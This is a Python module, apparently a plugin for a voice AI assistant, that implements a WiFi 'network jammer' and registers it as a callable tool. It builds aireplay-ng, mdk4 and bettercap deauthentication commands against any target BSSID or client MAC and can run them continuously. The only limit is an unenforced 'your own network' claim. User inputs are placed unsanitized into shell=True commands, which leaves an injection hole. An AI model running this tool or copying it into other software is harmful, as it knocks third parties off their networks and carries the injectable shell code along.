import subprocess
import time
import re
import threading
from pathlib import Path

def network_jammer(parameters: dict, player=None, speak=None) -> str:
    """
    Advanced Network Jammer for authorized testing on your own network.
    Supports aireplay-ng, mdk4, and bettercap.
    """
    action = parameters.get("action", "deauth")
    target = parameters.get("target", "")          # BSSID or AP name
    client = parameters.get("client", "")          # Specific client MAC
    interface = parameters.get("interface", "wlan0mon")
    channel = parameters.get("channel", "")
    duration = int(parameters.get("duration", 30))
    method = parameters.get("method", "aireplay")  # aireplay | mdk4 | bettercap
    continuous = parameters.get("continuous", False)

    if speak:
        speak("Initializing network jammer module, sir.")

    # Safety check - must have monitor mode interface
    if not interface.endswith("mon"):
        if speak:
            speak("Warning: Interface should be in monitor mode. Using wlan0mon.")
        interface = "wlan0mon"

    log_file = Path(f"/tmp/jammer_{int(time.time())}.log")

    try:
        if action in ("deauth", "jam", "attack"):
            if not target:
                return "Error: Target BSSID is required. Use 'target' parameter."

            if speak:
                if client:
                    speak(f"Starting targeted deauth attack against {client} on AP {target}.")
                else:
                    speak(f"Starting broadcast deauth attack on AP {target} for {duration} seconds.")

            cmd = None
            if method == "aireplay":
                if client:
                    cmd = f"aireplay-ng --deauth 0 -a {target} -c {client} {interface}"
                else:
                    cmd = f"aireplay-ng --deauth 0 -a {target} {interface}"

            elif method == "mdk4":
                if client:
                    cmd = f"mdk4 {interface} d -B {target} -S {client}"
                else:
                    cmd = f"mdk4 {interface} d -B {target}"

            elif method == "bettercap":
                cmd = f"bettercap -eval 'set wifi.deauth.ap {target}; wifi.deauth'"

            if not cmd:
                return "Invalid method. Use aireplay, mdk4, or bettercap."

            # Run with timeout unless continuous
            if continuous:
                cmd += " &"
                subprocess.Popen(cmd, shell=True)
                result = f"Continuous jamming started on {target} using {method}. Use stop_jammer to end."
            else:
                result = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True, timeout=duration + 10
                )
                result = f"Jamming attack completed.\nTarget: {target}\nMethod: {method}\nDuration: {duration}s"

            if player:
                player.write_log(f"[JAMMER] Target: {target} | Method: {method} | Duration: {duration}s")

            return result

        elif action == "stop":
            if speak:
                speak("Stopping all jamming attacks.")
            subprocess.run("pkill -9 aireplay-ng", shell=True)
            subprocess.run("pkill -9 mdk4", shell=True)
            subprocess.run("pkill -9 bettercap", shell=True)
            return "All network jamming stopped."

        elif action == "status":
            try:
                res = subprocess.check_output("ps aux | grep -E 'aireplay|mdk4|bettercap'", shell=True, text=True)
                return f"Current jamming status:\n{res.strip() or 'No active jamming detected.'}"
            except:
                return "No active jamming processes found."

        else:
            return "Valid actions: deauth, jam, attack, stop, status"

    except subprocess.TimeoutExpired:
        return "Jamming command timed out (this is normal for long attacks)."
    except Exception as e:
        return f"Jammer error: {str(e)}"


# ── Tool Declaration (add this to TOOL_DECLARATIONS in main.py) ─────────────
DECLARATION = {
    "name": "network_jammer",
    "description": (
        "Powerful WiFi network jammer for authorized red team testing on your own network. "
        "Can perform deauth attacks using aireplay-ng, mdk4, or bettercap. "
        "Supports targeted client deauth, broadcast deauth, continuous mode, "
        "and safety timeouts. Use with extreme caution."
    ),
    "parameters": {
        "type": "OBJECT",
        "properties": {
            "action": {
                "type": "STRING",
                "description": "deauth | jam | attack | stop | status (default: deauth)"
            },
            "target": {
                "type": "STRING",
                "description": "Target AP BSSID (required for deauth)"
            },
            "client": {
                "type": "STRING",
                "description": "Specific client MAC address (optional)"
            },
            "interface": {
                "type": "STRING",
                "description": "Monitor mode interface (default: wlan0mon)"
            },
            "channel": {
                "type": "STRING",
                "description": "Channel to jam on"
            },
            "duration": {
                "type": "INTEGER",
                "description": "Duration in seconds (default: 30)"
            },
            "method": {
                "type": "STRING",
                "description": "aireplay | mdk4 | bettercap (default: aireplay)"
            },
            "continuous": {
                "type": "BOOLEAN",
                "description": "Run continuously until stopped (default: false)"
            }
        },
        "required": ["action"]
    }
}